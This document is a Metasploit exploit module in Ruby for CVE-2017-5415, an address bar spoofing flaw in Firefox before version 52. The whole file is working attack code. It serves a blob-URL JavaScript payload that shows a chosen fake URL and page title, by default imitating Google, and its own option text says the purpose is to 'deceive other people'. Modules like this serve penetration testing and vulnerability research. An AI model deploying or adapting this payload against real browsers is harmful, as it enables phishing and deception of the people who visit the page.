##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpServer
    include Msf::Exploit::EXE
    include Msf::Exploit::RopDb
    include Msf::Exploit::Remote::BrowserAutopwn

    def initialize(info = {})
        super(
          update_info(
            info,
            'Name'           => "Mozilla Firefox - Address Bar Spoofing",
            'Description'    => %q{
    Address Bar Spoofing for Mozila Fireforx <52 (tested on 51 ver)
            },
            'License'        => MSF_LICENSE,
            'Author'         => [
                '649',          # Original RE research and exploitation
                'Sungha Park <l4wk3r[at]gmail.com>'            # Metasploit module
              ],
            'Platform'       => ['unix', 'win', 'linux'],
            'Targets'        =>
              [
                [ 'Automatic', {} ],
                [ 'Firefox <52', {} ]
              ],
            'References'     =>
              [
                [ 'CVE', '2017-5415' ],   
                [ 'EBD', '44266' ]       
              ],
            'Arch'           => ARCH_X86,
            'DisclosureDate' => "Apr 14, 2017",
            'DefaultTarget'  => 0
          )
        )

    register_options(
      [
        OptString.new('fakeurl', [ false, 'Put in URL to deceive other people ', "https://www.google.com\\"]),
        OptString.new('fakeservice', [ false, 'Put in service name', "google"]),       
        OptString.new('faketitle', [ false, 'Put in Title to deceive other people ', "Google Search"]),
        OptString.new('bodyhtml', [ false, 'Put in html body to show', "Not google"])       

      ], self.class)
    end

    def get_target(agent)
      return target if target.name != 'Automatic'
  
      nt = agent.scan(/Windows NT (\d+.\d*)/).flatten[0] || ''
      cm = agent.scan(/Mozilla\/(\d+.\d+.\d+.\d+)/).flatten[0] || ""
  
      cm_name = "Firefox #{cm}"

      case nt
      when '5.1'
        os_name = 'Windows XP SP3'
      when '6.0'
        os_name = 'Windows Vista'
      when '6.1'
        os_name = 'Windows 7'
      when '6.2'
        os_name = 'Windows 8'
      when '6.3'
        os_name = 'Windows 8.1'
      when '10.0'
        os_name = 'Windows 10'
      end
  
      targets.each do |t|
        # if (!cm.empty? && t.name.include?(cm_name)) && (!nt.empty? && t.name.include?(os_name))
        if (!cm.empty? && (!nt.empty? && t.name.include?(os_name)))
        return t
        end
      end
  
      nil
    end
    


    def get_html(t)
      url = datastore['fakeurl']
      service = datastore['fakeservice']
      title = datastore['faketitle']
      body = datastore['bodyhtml']
      html = <<-HTML
<script>
location=URL.createObjectURL(new Blob(['<b>#{body}</b><script>if(location.href.indexOf("#{service}")==-1){location.pathname="#{url}"}else{document.title="#{title}"}<\\/script>'], {type: 'text/html'}))
</script>
      HTML

      html.gsub(/^\t\t/, '')
    end

    def on_request_uri(cli, request)
      agent = request.headers['User-Agent']
      print_status("Requesting: #{request.uri}")
  
      target = get_target(agent)
#      if target.nil?
#        print_error("Browser not supported, sending 404: #{agent}")
#        send_not_found(cli)
#        return
#      end
  
#      print_status("Target selected as: #{target.name}")
      html = get_html(target)
      send_response(cli, html, 'Content-Type' => 'text/html', 'Cache-Control' => 'no-cache')
    end

end

